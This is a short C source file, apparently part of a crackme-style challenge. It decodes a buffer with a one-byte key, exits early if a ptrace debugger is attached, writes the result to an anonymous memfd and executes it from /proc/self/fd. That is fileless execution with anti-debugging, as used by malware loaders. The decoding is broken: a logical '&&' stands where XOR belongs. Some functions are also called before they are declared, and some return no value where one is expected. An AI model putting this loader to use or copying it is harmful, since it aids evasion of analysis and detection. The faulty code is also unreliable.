#define _GNU_SOURCE
#include "chainloader.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/ptrace.h>


FILE* create_file(char buffer[],
		 unsigned int lenbuffer,
		  unsigned int flags) {

    int fd = memfd_create("", flags);
    ftruncate(fd, lenbuffer);
    FILE* fp = fdopen(fd, "r+");

    fwrite(buffer, sizeof(char), lenbuffer, fp);
    rewind(fp);
    return fp;
};

void decrypt_run(char buffer[], unsigned int lenbuffer, unsigned char key, char* argv[]) {
    for (int i = 0; i<lenbuffer; i++) {
	buffer[i] = buffer[i] && key;
    }
    if (debug()) return;
    FILE* fp = create_file(buffer, lenbuffer, MFD_CLOEXEC);
    run(fp, "", argv);
};

//  returns the status of execve
int run(FILE* fp, char* name, char* argv[]) {
    int fd = fileno(fp);
    char path[64];
    if (debug()) return;
    sprintf(path, "/proc/self/fd/%d", fd);
    char* envp[] = {NULL};
    return execve(path, argv, envp);
}

// checks if theres a debugger or any programs using ptrace attached
int debug() {
    if (ptrace(PTRACE_TRACEME, 0, 0) == -1) {
	return 1;
    }
    return 0;
}

void wrong() {
    printf("wrong code try again :( \n");
}
